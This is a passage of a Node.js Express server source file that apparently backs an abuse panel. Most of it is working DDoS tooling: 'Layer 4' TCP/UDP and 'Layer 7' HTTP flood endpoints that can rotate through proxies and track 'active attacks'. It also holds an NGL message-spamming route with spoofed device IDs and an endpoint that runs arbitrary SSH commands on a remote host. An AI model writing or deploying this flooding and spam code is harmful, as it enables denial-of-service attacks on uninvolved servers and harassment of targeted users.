  db.history[username].push({
    id: newId,
    date: new Date().toISOString().replace('T', ' ').substring(0, 19),
    target: target,
    payload: `WA Sender: ${sender} | Msg: ${payload}`,
    status: status
  });

  writeDb(db);
}

// SSH2 VPS Installation Stream Route
server.post('/api/tools/execute-ssh', (req, res) => {
  const { ip, port, username, password, command } = req.body;
  if (!ip || !username || !password || !command) {
    return res.status(400).json({ error: 'Missing parameters. VPS IP, username, password and command are required.' });
  }

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Transfer-Encoding', 'chunked');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  const sendLog = (text) => {
    res.write(text + '\n');
  };

  sendLog(`📡 Connecting to VPS at ${ip}:${port || 22} as ${username}...`);

  const conn = new Client();

  conn.on('ready', () => {
    sendLog('✔ SSH connection established successfully!');
    sendLog(`$ Running command: ${command}`);

    conn.exec(command, (err, stream) => {
      if (err) {
        sendLog(`✖ Execution error: ${err.message}`);
        conn.end();
        res.end();
        return;
      }

      stream.on('close', (code, signal) => {
        sendLog(`✔ Process exited with code ${code}`);
        conn.end();
        res.end();
      }).on('data', (data) => {
        res.write(data.toString());
      }).stderr.on('data', (data) => {
        res.write(`[ERROR] ${data.toString()}`);
      });
    });
  }).on('error', (err) => {
    sendLog(`✖ SSH connection failed: ${err.message}`);
    res.end();
  }).connect({
    host: ip,
    port: parseInt(port || 22, 10),
    username: username,
    password: password,
    readyTimeout: 15000
  });

  req.on('close', () => {
    console.log('[SSH] Client disconnected. Closing SSH connection...');
    try {
      conn.end();
    } catch (e) { }
  });
});

// Global Chat Helper for 24-hour message expiration
function cleanupOldChats(db) {
  if (!db.chats) {
    db.chats = [];
    return false;
  }
  const now = Date.now();
  const twentyFourHours = 24 * 60 * 60 * 1000;
  const originalLength = db.chats.length;
  db.chats = db.chats.filter(chat => {
    if (!chat.date) return false;
    try {
      const dateIso = chat.date.replace(' ', 'T') + 'Z';
      const msgTime = new Date(dateIso).getTime();
      return (now - msgTime) < twentyFourHours;
    } catch (e) {
      return false;
    }
  });
  return db.chats.length !== originalLength;
}

// Global Chat Endpoints
server.get('/api/chat', (req, res) => {
  const db = readDb();
  const changed = cleanupOldChats(db);
  if (changed) {
    writeDb(db);
  }
  const chats = db.chats || [];
  res.json({ chats });
});

server.post('/api/chat', (req, res) => {
  const { username, message, image } = req.body;
  if (!username || (!message && !image)) {
    return res.status(400).json({ error: 'Username and either message or image are required.' });
  }

  const db = readDb();
  cleanupOldChats(db);

  // Find role/status of user
  let status = 'User';
  if (db.users && db.users[username]) {
    status = db.users[username].status || 'User';
  }

  const newChat = {
    username: username.trim(),
    status: status,
    message: (message || '').trim(),
    image: image || null,
    date: new Date().toISOString().replace('T', ' ').substring(0, 19)
  };

  db.chats.push(newChat);

  // Keep only last 50 chats to prevent database bloating
  if (db.chats.length > 50) {
    db.chats.shift();
  }

  writeDb(db);
  res.json({ success: true, chat: newChat });
});

server.post('/api/tools/ngl', async (req, res) => {
  const { username, question, count } = req.body;
  if (!username || !question) {
    return res.status(400).json({ error: 'Username and question are required' });
  }

  const sendCount = Math.min(parseInt(count, 10) || 1, 50);
  let successCount = 0;
  let failCount = 0;

  for (let i = 0; i < sendCount; i++) {
    try {
      const deviceId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });

      const response = await fetch('https://ngl.link/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
        },
        body: new URLSearchParams({
          username: username,
          question: question,
          deviceId: deviceId
        })
      });

      if (response.ok) {
        successCount++;
      } else {
        failCount++;
      }

      if (sendCount > 1 && i < sendCount - 1) {
        await new Promise(resolve => setTimeout(resolve, 350));
      }
    } catch (err) {
      failCount++;
    }
  }

  res.json({ success: true, successCount, failCount });
});

// Active attacks tracking map
const activeAttacks = new Map();

const connectProxy = (proxyHost, proxyPort, targetHost, targetPort, callback) => {
  const socket = net.connect(proxyPort, proxyHost, () => {
    socket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n\r\n`);
  });
  
  let buffer = '';
  const onData = (data) => {
    buffer += data.toString();
    if (buffer.includes('\r\n\r\n')) {
      socket.removeListener('data', onData);
      if (buffer.startsWith('HTTP/1.1 200') || buffer.startsWith('HTTP/1.0 200')) {
        callback(null, socket);
      } else {
        socket.destroy();
        callback(new Error('Proxy connection failed'));
      }
    }
  };
  socket.on('data', onData);
  socket.on('error', (err) => {
    callback(err);
  });
  return socket;
};

// Layer 4 Stresser API
server.post('/api/tools/layer4', (req, res) => {
  const { target, port, duration, method, proxies } = req.body;
  if (!target || !port) {
    return res.status(400).json({ error: 'Target host and port are required.' });
  }

  const durationSec = Math.min(parseInt(duration, 10) || 15, 60);
  const targetPort = parseInt(port, 10);
  const attackId = Math.random().toString(36).substring(2, 10).toUpperCase();
  const stopTime = Date.now() + (durationSec * 1000);
  
  let isStopped = false;
  const activeSockets = [];
  const activeSocketsUDP = [];

  const proxyList = [];
  if (typeof proxies === 'string' && proxies.trim()) {
    proxies.split('\n').forEach(line => {
      const parts = line.trim().split(':');
      if (parts.length >= 2) {
        const pHost = parts[0].trim();
        const pPort = parseInt(parts[1].trim(), 10);
        if (pHost && !isNaN(pPort)) {
          proxyList.push({ host: pHost, port: pPort });
        }
      }
    });
  }

  const getProxy = () => {
    if (proxyList.length === 0) return null;
    return proxyList[Math.floor(Math.random() * proxyList.length)];
  };

  activeAttacks.set(attackId, {
    stop: () => {
      isStopped = true;
      activeSockets.forEach(s => {
        try { s.destroy(); } catch (e) {}
      });
      activeSocketsUDP.forEach(s => {
        try { s.close(); } catch (e) {}
      });
    }
  });

  const floodTCP = () => {
    if (isStopped || Date.now() > stopTime) {
      activeAttacks.delete(attackId);
      return;
    }
    
    for (let i = 0; i < 30; i++) {
      if (isStopped || Date.now() > stopTime) break;
      try {
        const proxy = getProxy();
        if (proxy) {
          const client = connectProxy(proxy.host, proxy.port, target, targetPort, (err, socket) => {
            if (err) return;
            socket.write(_0xc.randomBytes(512));
          });
          client.on('error', () => {
            client.destroy();
          });
          client.setTimeout(1000);
          client.on('timeout', () => {
            client.destroy();
          });
          activeSockets.push(client);
          client.on('close', () => {
            const idx = activeSockets.indexOf(client);
            if (idx > -1) activeSockets.splice(idx, 1);
          });
        } else {
          const client = net.connect({ host: target, port: targetPort }, () => {
            client.write(_0xc.randomBytes(512));
          });
          client.on('error', () => {
            client.destroy();
          });
          client.setTimeout(1000);
          client.on('timeout', () => {
            client.destroy();
          });
          activeSockets.push(client);
          client.on('close', () => {
            const idx = activeSockets.indexOf(client);
            if (idx > -1) activeSockets.splice(idx, 1);
          });
        }
      } catch (e) {}
    }
    
    setTimeout(floodTCP, 100);
  };

  const floodUDP = () => {
    if (isStopped || Date.now() > stopTime) {
      activeAttacks.delete(attackId);
      return;
    }
    const client = dgram.createSocket('udp4');
    activeSocketsUDP.push(client);
    const buffer = _0xc.randomBytes(512);
    
    for (let i = 0; i < 50; i++) {
      if (isStopped || Date.now() > stopTime) break;
      client.send(buffer, 0, buffer.length, targetPort, target, (err) => {});
    }
    
    setTimeout(() => {
      try { client.close(); } catch (e) {}
      const idx = activeSocketsUDP.indexOf(client);
      if (idx > -1) activeSocketsUDP.splice(idx, 1);
      floodUDP();
    }, 100);
  };

  if (method === 'UDP') {
    floodUDP();
  } else {
    floodTCP();
  }

  res.json({ success: true, attackId });
});

server.post('/api/tools/layer4/stop', (req, res) => {
  const { attackId } = req.body;
  const attack = activeAttacks.get(attackId);
  if (attack) {
    attack.stop();
    activeAttacks.delete(attackId);
    return res.json({ success: true });
  }
  res.status(404).json({ error: 'Attack not found or already finished.' });
});

// Layer 7 Stresser API
server.post('/api/tools/layer7', (req, res) => {
  const { target, duration, method, proxies, headers, body } = req.body;
  if (!target) {
    return res.status(400).json({ error: 'Target URL is required.' });
  }

  let parsedUrl;
  try {
    parsedUrl = new URL(target);
  } catch (e) {
    return res.status(400).json({ error: 'Invalid Target URL format.' });
  }

  const durationSec = Math.min(parseInt(duration, 10) || 15, 60);
  const attackId = Math.random().toString(36).substring(2, 10).toUpperCase();
  const stopTime = Date.now() + (durationSec * 1000);
  
  let isStopped = false;
  const activeRequests = [];

  const proxyList = [];
  if (typeof proxies === 'string' && proxies.trim()) {
    proxies.split('\n').forEach(line => {
      const parts = line.trim().split(':');
      if (parts.length >= 2) {
        const pHost = parts[0].trim();
        const pPort = parseInt(parts[1].trim(), 10);
        if (pHost && !isNaN(pPort)) {
          proxyList.push({ host: pHost, port: pPort });
        }
      }
    });
  }

  const getProxy = () => {
    if (proxyList.length === 0) return null;
    return proxyList[Math.floor(Math.random() * proxyList.length)];
  };

  const parsedHeaders = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive'
  };

  if (typeof headers === 'string' && headers.trim()) {
    headers.split('\n').forEach(line => {
      const idx = line.indexOf(':');
      if (idx > -1) {
        const key = line.substring(0, idx).trim();
        const val = line.substring(idx + 1).trim();
        if (key) {
          parsedHeaders[key] = val;
        }
      }
    });
  }

  if (method === 'POST' && body && !parsedHeaders['Content-Length'] && !parsedHeaders['content-length']) {
    parsedHeaders['Content-Length'] = Buffer.byteLength(body);
  }

  activeAttacks.set(attackId, {
    stop: () => {
      isStopped = true;
      activeRequests.forEach(req => {
        try { req.destroy(); } catch (e) {}
      });
    }
  });

  const isHttps = parsedUrl.protocol === 'https:';
  const clientModule = isHttps ? https : http;
  const requestOptions = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (isHttps ? 443 : 80),
    path: parsedUrl.pathname + parsedUrl.search,
    method: method || 'GET',
    headers: parsedHeaders
  };

  if (proxyList.length > 0) {
    requestOptions.createConnection = (options, cb) => {
      const proxy = getProxy();
      if (!proxy) {
        const socket = net.connect(options.port, options.hostname, () => {
          if (isHttps) {
            const secureSocket = tls.connect({
              socket: socket,
              servername: options.hostname,
              rejectUnauthorized: false
            }, () => {
              cb(null, secureSocket);
            });
            secureSocket.on('error', cb);
          } else {
            cb(null, socket);
          }
        });
        socket.on('error', cb);
        return socket;
      }
      
      const tunnel = connectProxy(proxy.host, proxy.port, options.hostname, options.port, (err, socket) => {
        if (err) {
          cb(err);
          return;
        }
        if (isHttps) {
          const secureSocket = tls.connect({
            socket: socket,
            servername: options.hostname,
            rejectUnauthorized: false
          }, () => {
            cb(null, secureSocket);
          });
          secureSocket.on('error', cb);
        } else {
          cb(null, socket);
        }
      });
      return tunnel;
    };
  }

  const floodL7 = () => {
    if (isStopped || Date.now() > stopTime) {
      activeAttacks.delete(attackId);
      return;
    }

    for (let i = 0; i < 30; i++) {
      if (isStopped || Date.now() > stopTime) break;
      try {
        const req = clientModule.request(requestOptions, (res) => {
          res.on('data', () => {});
          res.on('end', () => {});
        });
        req.on('error', () => {});
        req.setTimeout(1000);
        req.on('timeout', () => {
          req.destroy();
        });
        activeRequests.push(req);
        req.on('close', () => {
          const idx = activeRequests.indexOf(req);
          if (idx > -1) activeRequests.splice(idx, 1);
        });
        if (method === 'POST' && body) {
          req.write(body);
        }
        req.end();
      } catch (e) {}
    }

    setTimeout(floodL7, 100);
  };

  floodL7();

  res.json({ success: true, attackId });
});

server.post('/api/tools/layer7/stop', (req, res) => {
  const { attackId } = req.body;
  const attack = activeAttacks.get(attackId);
  if (attack) {
    attack.stop();
    activeAttacks.delete(attackId);
    return res.json({ success: true });
  }
  res.status(404).json({ error: 'Attack not found or already finished.' });
});

server.listen(port, (err) => {
  if (err) throw err;
  console.log(`📡 Unified Express Server & WhatsApp API is running on port ${port}`);

  // START TELEGRAM BOT in the same process
  try {
    require('./bot.js');
  } catch (err) {
    console.error("Error loading Telegram Bot:", err);
  }

  // AUTO-CONNECT SENDERS
  initAllSavedWASenders();
});
